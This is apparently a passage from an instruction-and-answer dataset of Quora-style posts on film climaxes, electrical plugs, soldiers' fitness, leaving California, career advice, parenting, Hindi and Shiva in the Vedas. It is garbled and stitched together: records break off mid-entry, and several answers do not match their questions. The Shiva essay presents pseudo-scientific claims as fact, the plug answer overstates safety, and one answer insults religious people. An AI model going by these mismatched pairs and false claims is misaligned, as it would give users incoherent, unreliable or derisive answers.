Shouldn't be missed. When it comes to Thrillers, master of the genre Vijay 'Goldie' Anand's films are a case study, they had the most brilliantly crafted and longest climaxes ever, sometimes these climaxes formed the third act of the films and the twists in them will keep you on the edge of your seats even now, whether its Jewelthief or Johny Mera Naam. Most of these films were penned by K.A.Narayan saab, who is again known for writing the longest and most interesting climaxes, one of the most underrated climaxes by Narayan is for Victoria No.203 (that was spoofed wonderfully in the climax of Andaz Apna Apna, one of my most fav. Climaxes in Indian Cinema). As I just spoke about AAA Climax, I think we should also look at some of the funniest and most chaotic climaxes done by Priyadarshan, who brought the house down in the hilarious Hera Pheri climax. But the mother of insanely funny climax for me would be - Jaane Bhi Do Yaaron. Its funny and ironical. Masterpiece of sorts. Another smartly crafted climax was in Waqt, the mother of all lost and found films, this epic film had a climax thats a court room scene and its around 50mins long. Another climax worth mentioning here is Khosla Ka Ghosla - a funny dysfunctional family drama suddenly becomes a con film by the climax and uses the classic 'land mine con' and pulls it off with elan. In the recent times, I have enjoyed the very over the top, and unbelievably filmy climax of otherwise realistic - Guddu Rangeela (But thats more like a guilt pleasure)."},{"instruction":"What are some things that only electrical and electronics engineers know, but most people don't?","output":"I don't know, if any body has already mention this or not, and if then sorry. \\"Writing in a bit hurry\\" The three pin socket: Use of three pin socket had arose questions in million/ billion minds especially in past few years. You all might have some question that, there are many appliances in home itself which easily runs on two pin sockets, then WHY using of THREE pin socket is feasible ? ? In this pin one can easily track the length of two parallel pins are similar (even if in mm's). ( Two pin plug) (2 pin socket) But in three pin you can easily find that the 3rd pin top most (when kept pin in vertical pose) is a bit longer in length. The reason behind this is safety of human. When ever the pin is pushed in the three pin socket, then the first pin to get in contact with socket will be the longest pin of 3 pin plug. Note: here I have attached many images to make other understand the difference between socket and plug. Whenever the 3 pin plug is pushed, the first pin to get in contact with the socket would the top most pin ( grounding pin).In earlier cases the the two pin sockets and plugs, when comes in contact with human body raises risk percentage of human body getting electric shock.But after applying the 3 pin socket and plug, the risk of electric shock to human body gets reduced to almost 0.The risk of shock gets reduced due to transfer of the current flowing path, in 2 pin cases the current flowing path starts from socket to human body, whereas in 3 pin socket and plug, the path starts from socket to 3rd pin (top most pin, grounded pin) of plug and gets grounded resulting least risk of electric shock. Another note: edit and suggestions are most welcome. EDIT: I forget to add more details about the current capacity of pin. For Higher current, there is a 15 Amp version of the same 3 Pin plug, usually called the Power Plug or the M Plug. Live and neutral are 1 inch (25.4 mm) apart. Earth terminal is 1+(1⁄8) in (28.58 mm) away from live and neutral terminals. Typically, refrigerators, heaters and other high power devices are connected to this 15 Amp socket.The two pin plug is also called the Europlug. It has two round 4 mm (0.157 in) pins. It can be inserted in either way into the socket. Hence there is no fixed live (hot) and neutral (cold) terminals.

Take MMA fighters for example: Some are built like absolute units, but most aren’t. Most special forces have physiques that, from a bodybuilder’s perspective, would be considered mediocre at best, as would most fighters. While size and strength is definitely an advantage in the cage, most fighters will attest that the larger, more muscular dudes tend to tire out quicker. In this regard, there are diminishing returns to size, because those muscles require fuel: something which is a precious commodity to the body during periods of extreme stress. While having a more muscular frame is certainly an advantage in rounds 1 and 2, that very advantage becomes a liability as a bout drags out, when the lungs are screaming for air, the legs are trembling from lack of oxygen, and arms feel like pool noodles. In the cage, there’s still a benefit: If a fighter can utilize that strength and size advantage to get an early submission or knockout, it can be worth the potential drawbacks. After all, weight classes DO exist for a reason, and against an evenly skilled opponent, a strength or weight advantage can make all the difference needed to secure a belt. In a combat environment, however, almost all of those benefits are mitigated by the fact that a 405lb Bench Press doesn’t make 5.56 fly any faster. The vast majority of the fighting will happen completely out of reach of your imposing biceps. While a good amount of muscle is essential in order to bear a combat load, bound from cover to cover, and employ weapons systems effectively, anything passed what is required for the mission becomes a detriment to the soldier in a firefight. Whereas Justin Gaethje might be fighting for an hour, soldiers are often operating at their absolute effort threshold for a dozen hours at a time, or more. Besides there being no operational need for excessive muscle mass, and it becoming a liability during periods of extreme stress, it is also nearly impossible to maintain that mass in a high-operational tempo environment. I can only speak as a straight-legged infantryman, but the training tempo in a good unit can make it impossible to gain any appreciable mass. When you’re operating in the field for weeks at a time, you carry only EXACTLY what you need. This applies to food, as well. As any bodybuilder will tell you, the time at the gym makes up only 1% of the muscle building process. The rest is in taking massive amounts of food, and monitoring sleep and recovery with a draconian eye. In the field, it’s not uncommon to go 24+ hours without sleeping or eating, to say nothing of combat. The body responds to these stressors by increasing levels of cortisol, which aids in alertness, but is also a catbolite. Meaning, it encourages the body to undergo catabolysis, where it switches to protein energy syntheses. During this process, the body begins to break down muscle tissue to convert into energy. The human body is not built to be as large as Mike Mentzer or Chris Bumstead. Evolutionarily, we’re more designed to look like a marathon runner. Any excuse the body can find to shed weight, it will. In summary, the reasons why operators don’t look like professional body builders is that: 1: There is no operational need for that mass, because we fight with bullets and bombs, not boxing gloves2: That mass would be an inherent liability anyways, from an energy conservation viewpoint3: That mass would be nearly impossible to achieve/maintain in a high operational tempo environment."},{"instruction":"Can I wear EarPods on a plane to keep my ears from popping?

I was at a personal inflection point in my life. My kids had moved out of the house, I didn’t “need” the big (and high cost) house with lots of bedrooms and it was time to move away from a long term, no pay situation with a startup I co-founded. So my wife and I talked through if we wanted to stay in CA or go somewhere else. On the positive side, California has a lot going for it. The weather is great, the technology industry is absolutely amazing, and the people there were always great. However, there were a lot of downsides for me personally that drove me away: No discussion can ignore the cost of living. Everything is expensive, not just housing. I now pay less for my housing, my electricity, gas, food and even my monthly haircut (at the same chain) is cheaper. Much of that flows back to the cost of property as every business has to add a bit of the cost of their location into the overhead of their business, but not all of it. As an example, I was paying about .25/kWh for electricity in CA (not easy to predict due to the tiered pricing system) and now pay .079/kWh, flat.One of the things that drive the cost of housing so high is that there are so many people there. But this has other impacts. Traffic is absurd, public transportation is over crowded, waiting lines to get into restaurants are long, the zoo is crowded, the parks are crowded, the schools are crowded… you get the point.On top of that if you are remotely conservative, or even pretty centrist you are treated like a pariah. I know more people than I can count who secretly voted for Trump in the last election and not one of them will admit it at work or in their friend circles. And those who have have been cast away. But if you don’t tow the progressive line on immigration, gun control or any other host of issues (and even did not vote for Trump) you’re in trouble. For examples of this, read the lawsuit complaint by the people suing google right now for unlawful termination. California, especially the bay area, has become the largest echo chamber in the country exhibiting fascist behavior in their zeal to protect the nation from fascists. (kind of ironic, no?)The state is downright hostile to business through regulations and over-taxation. So much so that numbers of companies are packing their bags and leaving, the most notable was Toyota moving to Texas a few years ago. But for every big business moving there are lots more small businesses doing so as well.And finally, the state is in financial trouble, although they have been able to paper over the issues with the ill-advised temporary tax increases passed via ballot proposition (how nice, one of the reasons I haste direct democracy) that has now become pretty much permanent via another ballot proposition. The state has a balanced budget and a surplus, that is if you don’t count the massive unfunded liabilities on the balance sheet. Not only that, but the state is highly dependent on the incomes of a pretty small number of people for a large part of their budget (I’ve read that 3% of the population pays 60% of the income tax) And those people generate a lot of their income via capital gains. So even small adjustments to the stock market can have HUGE impact on the CA finances. And at 13.6% there are plenty who are packing their bags and leaving. So yea, I packed my bags, sold my house and moved east. I’m happy I did, although there are things that I miss about CA. When I retire I may well buy a home there somewhere but I can assure you I will live there less than 180 days a year since I have no intent of being a CA resident ever again. (I won’t say I’ll never do it, since someone could make me an offer I can’t refuse and I might just go back)"},{"instruction":"What skills will help anyone make a significantly higher salary as an employee?","output":"0.0 Believe in yourself: Most of the times, what happens is that people stop believing in themselves. Then, their bosses set them up with mediocre tasks to finish, that fill up their time. Since most of the tasks are to be done, but they are sub-par with a candidate's knowledge, the candidate loses interest very quickly. The jobs become repetitive, and there is no reward for repetitive jobs. Sometimes you may be so uninterested in the job, that you may not even finish it on time, and now you would be judged as a weak candidate, and you would be set up with even inferior tasks. The cycle may repeat year after year, and one may end up stagnating. 0.1 Admit your mistakes: The script most people usually begin playing is - my boss did that to me. My company did that to me. My peers did that to me. The reality is - that you let them do that to you. Instead of taking care of your own career, you let someone else take care of it, then success won't come to you. It is like this - You know that exercising is healthy for you, but because your boss has loaded you up with so much work, that you are left with no time, you sacrificed your exercise. In this case, no one but yourself must be blamed. It is not your boss's fault that you didn't exercise. It is your own fault. Same applies to your career. You did not take care of it, hence you may be suffering. It is not your boss's fault. These are some rules to hold on to so that you can shine in any job! 1. Quality comes before output: You should demonstrate great quality in whatever you do - the mails you write, the excel sheets you maintain, the computer programs you create, or whatever job you perform. If you do not demonstrate great quality, people would have to check your work, and that is energy absorbing. However, if you put efforts towards delivering great quality, you would build trust over years. I can tell you from my personal experience, that trust building is not an easy task, and without trust, you would never get a bigger task to do. 2. Control your mistakes: There are usually two types of mistakes people make and these very much point to two things. Aptitude, and Attitude. Aptitude simply means, that you made a mistake because of not knowing something. To eliminate such mistakes, constantly learn new things, and stay on the top of technology. And attitude means, that you made the mistake because of your carelessness. In any industry, mistakes happening out of both aptitude and attitude are harshly judged, more so, those arising out of attitude are even more harshly judged. You may even end up getting a tag of 'troublemaker'. 3. Do not do redundant tasks: These tasks must be avoided at all costs. You are not only wasting your own time, but your organization's time. Identify such tasks, and stay away from them. 4. Identify things that add value: Work on these things with great pride, and work super hard on these. 5. Identify things that reduce value: Work on eliminating them with great pride too. Note that these are not the same as redundant tasks. 6. Write down your plan of doing things: Without a plan, it is easy to get distracted and one may not achieve too much. Also, keep a good track of your plan. Every week, track your progress more than your boss, and you would note that your boss will begin trusting you more and more. Then he would say nice things about you to others. It is then others would notice your great work, and you would get recognition. 7. Create great teams: Work with a solid team of professionals who are career driven. You are simply an average of five people you meet the most. Change the group of people you interact with, and your value addition will also go up. 8. Reward people: When you reward others, others reward you. This would help you in building great teams in future, and it would be easier to then reap the benefits out of them. 9. Repeat continually: No one in the world has achieved success without repeating such steps again and again. Once you learn your own steps, continue repeating them systematically. 10. Stay happy and love your work: Last but not the least, love your work as much as possible. It is only then your career would change into a rewarding one. 11. Communicate really really well: Communication is key in this world, and if you become a really good communicator, you would build trust and you would get superior raises."},{"instruction":"IQ a good measurement of one’s intelligence?","output":"Not at all my dear. While IQ can provide useful information about an individual's cognitive abilities, they have limitations that need to be considered. Firstly, IQ tests often measure only certain types of intelligence, such as logical-mathematical and linguistic intelligence, while neglecting other types of intelligence, such as emotional intelligence, creativity, and practical intelligence. Secondly, IQ tests may be culturally biased and may not take into account cultural differences or experiences that can affect performance. This can lead to inaccurate or unfair results for individuals from different cultural backgrounds. Thirdly, IQ tests measure only a narrow range of cognitive abilities and do not account for other factors that can affect overall intelligence, such as motivation, personality, and life experience. Lastly, IQ tests only provide a snapshot of an individual's cognitive abilities at a specific point in time and may not account for changes in cognitive abilities over time. In summary, IQ tests can provide some useful information about an individual's cognitive abilities, but they are not always an accurate or comprehensive measure of overall intelligence. Other factors need to be considered when assessing an individual's intelligence, including emotional intelligence, creativity, practical intelligence, and cultural background."},{"instruction":"Why is abortion such a big deal in America?","output":"it is the religious nut cases and yes, I realize that is redundant"},{"instruction":"f Biden forgives student loan debt, why not cancel the GI Bill for veterans?","output":"If.

But often franchise restaurants will slightly modify their recipes to local tastes and ingredients available. While in Europe in 1975, the American kids I traveled with were beyond happy to see the golden arches in Paris. They waited in line for nearly an hour to get a tiny BIG Mac Burger Royale, and an equally tinier paper packet of fries. Not a fan of that type of food, I watched them eat their Americanized stuff while I noshed on a street vendors’ baguette and saucisse sandwich, and for dessert, a crimson-colored sorbet with Cassis. But just 20 years later while traveling through Spain and southern France, I noticed a great deal of American style cafes or restaurants. They made sandwiches (Americans are all about the sandwiches and burgers, right?) and burgers. Seeing the imposters on the menu board and people eating them I had to laugh. We ordered what was supposed to be a grilled cheese sandwich. It was the thinnest, smallest slices of bread (like melba toast thin), with a slice of see-thru tomato, an equally thin sliver of cheese, that was a hard, not a melting cheese. It was a dismally unappetizing lunch offered with four (exactly four) potato chips, and a single tiny green olive. There was no butter, no mayonnaise (extra), no mustard (extra), and we were not enthused by their take on the American meal, which also was expensive. We could have imported an entire loaf of Velveeta or even cheddar cheese for its price. I see the trends in Mexican towns too. But sometimes the food ends up being weird locally sourced ingredients as a substitute, but good."},{"instruction":"w has being raised by extremely strict parents affected you as an adult?","output":"Let’s see. I have anxiety and pretty-broken self-esteem. Many a time, I experience imposter syndrome and cry in secret. I tend to get nervous and babble while talking to even my friends even though I got no speech issues at all. I cannot initiate or continue conversations and always reply in “Yes, ok, agreed, correct, sure, np” etc. I am bad at creative writing. I fear touching new things for they will break. (My dad used to yell very badly if I broke even a very cheap thing). I have some attention retention problem which I feel was ignored by them for they were ignorant in this regard. Cannot talk to people in the eye or look forward while walking on the road, developed a bad habit of lowering my eyes most of the time. I am a Grammar/Punctuation Nazi (haha) But it’s alright! Yeah, sounds weird but, yes, I am grateful! I would not have been here had they not been strict. When I was born, sex determination was still legal & female foeticide was rampant in my country. They could have easily killed me in the womb itself or dumped me in some dustbin behind the hospital. (No, my parents never fed this in my head.) Moreover, my dad hates kids in general. But my parents were amongst the most educated lot in our family, so despite the despise, they brought me into this world. There have been numerous times I have had depressive episodes thinking how I have not done enough for them. Also, I am not happy with my career choice (it’s burdensome) but still I am thankful they persuaded me to go by their way. Today even during pandemic when numerous jobs were slashed, I still had a decent paying job. I will always be grateful and indebted to them. Shall we talk about positives now? I am well-mannered as compared to most of the people I encounter. I have never used abusive language or misogynist curses. I have higher level of tolerance. I have an “I am willing to listen to you” attitude. I have profound respect towards people with more knowledge and experience than me - I’d say this is a more cultural thing here. I grew up in a no-internet environment so I was not exposed to the toxicity that teenagers today grow up in. I have a very strong attachment with my parents. Many a times, I dreamt of them dying and even woke up crying 555. I am responsible - ready to be the head of the family in their absence. Not into drugs, alcohol or any other narcotics. Follow rules. Honest. They sacrificed their sleep to wake up early and cook healthy food for me instead of handing me some cash to buy junk food. Today I have no allergies, deficiency, diseases etc. Personally, I feel parents should be strict but not dictatorial or abusive. If they are not, the child is bound sway on a self-destructive path. Many confuse strictness with physical abuse. It’s completely different. If I become a parent tomorrow, I will be like them, no second thoughts about it. But I’ll work more on few things from my side and those would be - 1) Bonding by physical touch like hugs, caresses etc. 2) Communication gap 3) Extra curriculars like martial arts, classical arts, foreign language to develop confidence in personality Cheers! <3"},{"instruction":"Hindi language meant to unite Indians or to trigger Indians?","output":"Language is an uniting factor in Europe. England, France, Germany, Spain etc.countries are formed on the basis of languages. Definitely the language and culture of the particular region unites the people. In India, the union of diversities,languages have divided the people. Maharashtra, Gujarat, Kerala, Punjab etc. states were formed on the basis of majority seaking language. The love between two people of different states is decreasing. Now every state is behaving like an independent country. Is Hindi language uniting Indians? Yes it is uniting. It has been successful in uniting more than seventy percent people(surveys misled). Hindi is not taught regularly in schools of few states only. Most Indians have accepted Hindi as link, useful , communicable or as like national language. Some people may like it or not like it. But the truth is Urduvised Hindi is regularly spoken in army, railways, most nationalised banks, post offices and the places where a link language is needed. English is regularly spoken in airports, stock markets, in the chambers of government officers and higher education centres. But English is no match for the popularity of Hindi. Some people from South India are extremely unhappy about the imposition of Hindi as national or a major link language. But in the absence of another such language Hindi is going to rule India. The 15–20 percent Muslims who speak Urdu are indirectly promoting Hindi. Combine Hindi and Urdu speakers you shall understand their strength! I belong to Karnataka. I know more use of Hindi may bite Kannada. But Kannadigas should know that a mere opposition to Hindi is not going to help in the development of the state.Hindi speaking people in the state have contributed well. In the last 65 years of formation of Karnataka Kannadigas have failed to bring Kannada fully in medical, Science, Engineering and Law colleges. In the last 20 years they are failing to produce good quality literature, movies also and induce pride in the language. Naturally Hindi and English are filling in the ‘blanks'!

Because most people are unlearned who have actually not read Vedas or scriptures but simply follow some Daassas or sinful organisations, than vomit there sick minds false and ill knowledge. Here I would try to be precise but fact full because elaborating Vedas about Shiva, there so much of material that it will become a new Veda itself as it will be explanatory in metaphysical and scientific terms too because Shiva has inherent connection with science the scientific community recognizes him as Alpha and Omega for that they also have installed huge Nataraj Shiva,s Idol in front of HOLY GRAIL of science The Hadron collider LHC at the Heart of CERN. The point is when some one or say in plural,when human wanted to know greatest or most basic reason for this entire cosmos having infinite galaxies at the utmost humanly possible depth they have found it to be SHIVA. Hence the Vedic Rishis who were scientists of Meta Physical realm who USED TO FREQUENT BETWEEN PARALLEL UNIVERSES also researched and found Shiva or Rudra as the Greatest Tattwa, The final god The reason the Cause of all the Effects of the Universe and they have elaborated there research and described Shiva as greatest God ultimate. So even by science you wont stumble upon jesus or any other Sanatana Gods or so called human made Gods but, SHIVA ONLY ,the formless base of Universe the power of all the energy factor of universe. Dr. John Haglin Einstien of this age, among scientists Describe Shiva of Vedas as Quantum Unified field, The power behind entire existence infinite Cosmos and all Big Bangs, which is reality and science of Shiva Lingam, Shiva Lingam is a technical and True shape of Godly Supra Energy Vortex the formless form of quantum unified field. To explain this we need another answer,but that will be a different subject, But the point is scientists and true seekers whenever they found ultimate truth through Spirituality or through Science have found ONLY SHIVA as Finality from where nothing goes beyond every thing ends and emerges from here Only. So Here i will elobarate how Rig Veda than all other Vedic texts of all Four Vedas and there branches and cover verifiable Facts and truth, not hear say or any cults false doctrines But pure Vedic God Shiva, no Smriti or other Scriptures. Check How Sir and Dr John Hagelin describes Vedic Shiva as silent Ruler most powerful most beautiful the Alpha and Omega. Dr. Hagelin Reveals The Reality Of The Silent Ruler Of The Universe Shiva As Expressed By The Superstring Of The Unified Field. Vedas sing more eulogies of Shiva Rudra or Raudragni, Jaatveda Than any other Lord or Gods. Even from the very first Shloka Mantra of very first Veda The Rig Veda they started Singing praises of Rudra Shiva and his major eight forms which covers entire universe with five elements and Pran, Atman and Pradhan. If you will read the first Veda, It starts from praying Shiva Rudra from very first Shloka, “Agni milite Purohitam” , (Agni is Shiva or Rudras Form one of his eight Vedic manifestations). There are several Suktas dedicated only to him. In Rig Veda and in fact same is the case with other three Vedas Rudra Shiva is everywhere in Aranyaks, Bramhans, Upnishads, Gyan khand ,karma kand, Jyotish, vyakaran i mean, where you wont find him when you read how Vedas describe him its like looking for gold in mine full of gold and and some nerd asks where is gold in the mine, well it is still here not only one can see but one can experience it too. So Rudra is mentioned in Shlokas, Mantras, Suktas (for which You will have plenty of evidence from real text below in this write up) even whole Upanishads are dedicated to him only. The Gyan khand of Vedas which is main part of Vedas metaphysical science is known as Upanishads. Now among 108 Valid Upanishads of Muktika Cannon from all four Vedas more than 42 + (16 unpublished Upanishads) are dedicated to Shiva exclusively and inclusively. And That is more than half of total text, And that is much much more than any other single Gods eulogy in Vedas, How else glory of greatest God would be sung if not like this. In the Shatarudriya and in the whole Veda, Rudra is called Siva, Sankara, Sambhu, Isana, Isa, Bhagavan, Bhava, Sarva, Ugra, Soma, Pasupati, Nilagriva, Girisa, Mahadeva and Mahesvara among thousands of other names. Vedic Hymns The MahaRudrashtadhyayee. The most famous and Longest eulogy among all, The Rudrashtdhyayi which consists of Eight major Suktas belongs to Shiva Rudra Only, it is the Greatest Longest most powerful eulogy Vedas have ever sung for a Single God Head among all other Vedic Gods. In Shiva Rudra merge all Gods, The ShatRudriyam or Shree Rudra Sukta or Rudra Neela Sukta is repeated in all Vedas many times not only in Both Shukla and Krishna Yajurveda, than Rig Veda also has so many Rudra Sooktas, Atharva Veda and Saamveda have way many Suktas mantras for Shiva Rudra and his synonyms. This is most repeated eulogy in all Vedas and its various branches. Search net and find 1000 of links for Rudri at you tube, Shiva is the only Godhead for whom greatest and longest and most powerful eulogy was made, None other God commands such high respect, fear and awe that even Panch Bramhas bow in front of him (Ganpati Kartik, Durga, Vishnu, surya and Rudra). The Rudrabhishekam with Rudram MahaNyasam is most elaborated methodical worship in Karma Kanda Khand, of any single Vedic God ever. The Worship ceremony is so powerful that even if it is still done rightly miracles do happen, ask any astrologer about, what he would consider the most powerful Upay or Solutions for things, he must suggest, all would suggest Mahamrityunjay Jaap ,Rudrabhsihekam and Shat chandi as most powerful solutions for any mundane or spiritual thing, thus still millions of people organize it and get what they want with simple good. Its sung in all major Shiva Temples everyday. And about this great eulogical Worship and this mantra scripture Declared that VR^ixasya mUlakena shakhAH puShyanti vai yathA | shive rudrajapAtprIte prItA evAsya devatAH | ato rudrajapAdeva bhuktimuktiprasiddhyataH || Even as by (watering) the roots of a tree, all its branches are nourished, so by pleasing Shiva with the chant of the Rudram , all the gods are pleased. Therefore, the attainment of bhukti - enjoyment - and mukti - liberation- is only through chanting the Rudram with devotion. Vedas saw and witnessed him as Final God, The God of all Gods, The father of Trinity, and whole universe, who has no body above him, there is no one beyond or second to him,”Eko hi Rudro na Dwiteeyay”. He is alone Swayambhu (Self Reliant) and (Beejak) Seed Giver of entire existence and Vishnu is Yoni (Womb) of universe, “Vishnurvishwa JagatYonih” Shiva is Reason of all the Causes and Cause of every Effect “Karnam Parama Kaaranat”. Vedas Declared him Sovereign Lord of all that exists, “Vishwadhipo Rudrah Maharshih”. (YajurVeda) The one in front of whom all Gods including Bramha and Vishnu have accepted there animal instinct, and declared him as Pashupati The lord of all gods and all beings “Sarwe Deva Pashutamvapu Swayam Tasmat Pashupatir Babhoov”. (Yajur Veda) The Only God head whose energies never depart from him, “īśānādasya bhuvanasya bhūrerna vā u yoshad Rudrādasuryam”. (Rig Veda) Who is above time the Kaala, the one and only Mahakaala and Sadashiva Rudra. “Yo Vampaden jaghan Kaalam”. He kicked Kaal and subdued him, he Time favours him and his bhaktas always. All Four Vedas were very peculiar, straightforward and truthful about Him. He was referred frequently as None like others, The one and Only without a second, No one but Him, “Sa Eko Rudro dheyah Sarvesham”, “ Eko Hi Rudro”, “Aek aiwa Shivo”, “Saeesh aesh aive Rudro”. Even they went to the extent to declare that, leave all Gods who are Pawns of MahaRudra instead worship Him only, through One pointed high Devotion. “Aek aiwa Shivo nityastato anyatsakalam mrisha tasmat sarwanparityajya Dhyeyaan Vishnawadikansuran” (Atharvaveda). These are the kind of ways Vedas tell about him and read Vedas they do not confer that status to any other God so highly and frequently, declaring the Code of Adwait, That the truth is God is one, Jeeva is fragment or Shiva God. Hence Jeeva is also Shiva, or to say that to become Shiva is Goal of every Jeeva because it is fragment of Shiva. In Shwetashwatar Upnishad, all Rishis have assembled together and did Shastrarth research on Param Bramha God, they came to know that discussion wont be able to establish the truth hence they all meditated for several celestial years with an inquiry that who is that one from whom everything comes and merges in, who is existent before time who is that One Final God of Gods who has no body above, nothing beyond. And after many years and continuous Samadhi (Ultra Aplha State of Mind) it was Revealed to Bramha Rishi, Shwetashwatar he got enlightened and he floating in ether with immense bliss and divine illumination declared to all Rishis Thus spake the great Rishi in second shloka mantra of third adhyay (chapter) of Shwetashwatar Upnishad of YajurVeda, which is one of the prime 6 Upnishads :- Eko hi Rudro na dvitīyāya tasthurya imāṃl lokān īśata īśanībhiḥ / pratyaṅ janās tiṣṭhati saṃcukocāntakāle saṃsṛjya viśvā bhuvanāni gopāḥ // 3.2 // Rudra is truly one; for the knowers of Brahman do not admit the existence of a second, He alone rules all the worlds by His powers. He dwells as the inner Self of every living being. After having created all the worlds, He, their Protector, takes them back into Himself at the end of time. Not only this Upanishad but YajurVeda, Taittariya Samhita 1.8.6, clearly states Rudra as Pashupati and Lord of sacrifices and as The Greatest One God without a second. .\\"Pasunam sarma asi sarma yajamanasya sarma me yacha Eka Eva Rudro Na Dvitiyaya Tasthe Akhusthe Rudra Pasuh Tam Jushasva. YajurVeda, Taittariya Samhita 1.8.6. We Pray to Lord of all Sacrifices and The Lord of all Gods who is Rudra only the greatest Lord of entire cosmos who has none as second, and all beings and Gods are his Pets (Pashus) and he alone is there master there sole lord The Pashupati. Now those cultists who say Rudra is different from Shiva those fools shall read something truthful rather than vomiting there dirt here, Rudra is frequently referred in Vedas as Shiva, 'Shivo namasi' (Yaj. S. 3-63) clearly calls him Shiva than. The Famous and most popular among masses Panachkashar mantra is Pure Vedic the Central Mantra, where other popular mantras are not Vedic necessarily, Panchakshar Mahavidya Mantra is established in the very heart of all Vedas deliberately in Yajurvedas the MANTRA occurs in Taittareeya . 4. 5, 1-41. \\"Namah shambhave cha mayobave cha namah Sankaraya cha mayaskaraya cha NAMAHA SH1VAYA cha Sivataraya cha\\" And the famous Satarudriyam OR RudraNeel Suktam which is highly praised in the Upanishadas and in the Purans & Mahabharat etc, forms also the central portion of this central Veda. And this is a description of God as the all, the all in all, and transcending all, 'Visvadevo, Visvasvarupo, Visvadhiko. Rudra as Pashupati - lord of all beings including all Gods and humans and animals. Mohenjodaro a culture 7500 years ancient shows that Shiva Lingam and shiva as Pashupati was the main deity of those times in all over the world. A Pashupati Seal found there is very famous among archaeologists and anthropologists. And the Root of Pashupati is of course In Vedas. Shiva is declared as Pashupati in Vedas and Pashus (animals) are not what you think, Pashupati does,nt mean Lord of animals but entire universe and all Sentient beings and all Gods accepted that they are Pashus because of having animal instinct and being inflicted by Panch Pashas (Five affliction) which influence all beings even Bramha or Vishnu or Avataras are afflicted by these Five Pashas hence including them entire Universe of beings are Pashus (Pets of Shiva), and he alone is Pashupati there Master There owner, Pashupati does,nt mean lord of animals but Lord of all beings who are always afflicted with Five Pashas, chains and everything that exists and gods are also chained by these pashas (like lust, anger, false ego, envy, selfishness etc) All devas agreed including Vishnu Bramha Indra and performed Pashupat Vrat to appease shiva so he would absolve there pashas and set them free. Whenever Vishnu takes avatar he performs PAHSUPAT Vrata. In Bible also The God is called Shepherd and all beings as his flocks or Sheeps or animals, this allegory has root in this Vedic incidence only asserts scholars. How he came to be known as such, Here is the description-: Yajur Veda, 6th Kanda, 2nd Prasna, 3rd Anuvaka and 12th Mantra. Mahapuram Jayantiti ta ishum Samas Kurva to gnium anikan Soman Salyam Vishum Tejanam the bruvan ka imam asishatita Rudra iti aleruvan rudro vai Krura; Somya twiti, sobravit Varam Vrina aham eva Pasunam Adhipatirasaniti tasmat rudrah Pasunam adhipatishtam rudrova Srijat Satisra Puro bhitva ebhyo: lokebhys Suran pranudata. \\"There were the three cities of iron, silver, and gold (belonging) to Asuras. The gods not being able to win them (by fight) wished to win them by siege. (The great) say that He (the Brahmin &c), who knows (what ought to be known) and he (the non-Brahmin &c), who does not know - they are able to win by seige the great city which cannot be overtaken by fight: Then the gods made an arrow composed of Agni as (the bottom hilt) Soma as (the middle) iron and Vishnu as (the top) and declared (consulted) who will discharge it, and determined None but MahaRudra, (was) as only and Greatest God amongst them all, being capable of discharging such an apocalyptic weapon which carried all the weight and might of all Devas. Upon hearing such request) He (The Rudra) said the boon was made over, From Now on whole Universe must know the truth and accept that I am the Lord of Infinite Cosmos, all of you, all Gods and all beings are my Pashus (pets afflicted by five pashas ), hence all are Pashus both the two-footed Devas and manushyas and four-footed; So Rudra the Lord of Pashus, The Pashunampatim discharged it, broke up these three cities, and blew them up all from these worlds.\\" Aum namo bhagavate RudrAya In this Mantra, the Highest Reality, Brahman is identified with Rudra who is MASTER of Trinity who assigned the three functions of creation, protection or maintenance and dissolution of the universe to three Gods. The epithet Rudra means the destroyer of all that is false or evil, ignorance and their effects, sin sorrow and suffering and who confers wisdom and [LINKED_TEXT: http://bliss.In] [URL: http://bliss.in/] the Rig Veda Rudra is the personification of Brahman in three rounded aspect. In the later portion of the Veda, Rudra is described as Siva, the auspicious, as Mahadeva, the great God. Vedas also say about two aspects of Shiva viz., The Ghora meaning fierce the terrible and Aghora, Saumya meaning the benevolent kind and auspicious . The Upanishad speaks about Brahman as Rudra, its teaching lays stress on the destruction of Sin and Agyan (ignorance) by Shiva worship and great Spiritual progress. Rig Veda starts from praying to Shiva Agnimilite Purohitam ,and Agni is one of the eight manifestations of Rudra as mentioned above, Agni is also called Prana, and Prana is Rudra (Brihadaranyak Upnishad), Sashpinjaray twasheemate (Shatrudriya Shukla Yajurveda), says We bow to the god who is fire (Agni) flaming bright Red and yellow divine hue. And there are many places where Agni, Rudra, Prana, Atman, Parmatman, are said to be synonyms and used in interpolating ways. The RigVeda 6.49.10 calls Rudra as “Bhuvanasya Pitraah” The Father of the Universe. Bhuvanasya pitaram ghīrbhirābhī rudram divā vardhayā rudramaktau | brhantam rshvamajaram sushmnam rdhagh ghuvema kavineshitās. “Rudra by day, Rudra at night we honour with these our songs, the Universe's Father. Him great and lofty, blissful, undecaying let us call specially as the Sage impels us. Now examine how else Vedas would describe the greatest Lord who is god of all Gods and entire universe. They revere him as “Bhuvansya Pitrah” ,the father of entire existence of beings and Cosmos, So he is not a simple Deity or warrior God as unlearned dumb people say but he is regarded as Supreme God Head, Father of entire universe who has no body above or beyond there is no body equal or second to him. He is sovereign Lord The Master of Entire existence, and this declares all Vedas Unanimously thousands of times and this assert Rig veda more in this Mantra The Rig Veda, 2.33.9 calls Rudra as \\"The Lord or Sovereign of the Universe\\" Iśānādasya Bhuvanasya . Sthirebhiranghaih pururūpa ughro babhruh śukrebhih pipiśehiranyaih | īśānādasya bhuvanasya bhūrerna vā u yoshad Rudrādasuryam || 'With firm limbs, multiform, the strong, the tawny adorns himself with bright gold decorations: The strength of Godhead never departs from Rudra, him who is Sovereign God of this Universe , the All mighty.' Now Veda is mentioning Shiva Rudra as Iśānādasya, The soveriegn GODHEAD of bhuvanasya bhūrerna, Entire Universe three worlds all which exists and beyond. Or does any clearer words are needed to convey and understand logically and truthfully and honestly that Rudra or Shiva is regarded as Supreme most God Head who is self energized whose ultimate super most power never departs from him, who is father and guardian of entire Universe and all Gods and beings. Than Rig Veda 2.33.10 Na vā ojīyo rudra tvad asti A Mighter and Greater than you there is none, O Rudra. Rig Veda 7.46.1, Aṣālhāya sahamānāya vedhase. Rig Veda. 2.33.3. Whom no one may overcome. Tavastamas tavasā Mightiest of the mighty. The most famous Shiva Mantra Tryambak Mantra or MahaMrityunjay mantra is in Rig Veda, Rig Veda 7.59.12. Tryambakaṃ yajāmahe sugandhiṃ puṣṭivardhanam Urvārukamiva bandhanān mṛtyormukṣīya mā'mṛtāt We worship Tryambaka, sweet augmenter of prosperity. As from its stem a cucumber, may I be freed from the bonds of death, not reft of immortality. kad rudrāya pracetase 